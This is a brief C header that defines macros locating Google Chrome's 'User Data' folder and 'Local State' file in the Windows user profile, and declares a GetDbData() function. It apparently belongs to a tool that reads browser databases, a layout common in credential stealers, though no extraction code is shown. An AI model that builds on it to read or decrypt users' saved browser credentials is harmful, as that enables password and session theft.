#ifndef _GETDBDATA_
#define _GETDBDATA_

#define MAX_PATH_LENGTH 260 // Maximum path length

#define CHROME_PATH(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data", getenv("USERPROFILE"));
#define CHROME_PATH_LOCAL_STATE(chromePath) snprintf(chromePath, MAX_PATH_LENGTH, \
        "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", getenv("USERPROFILE"));




void GetDbData();
#endif 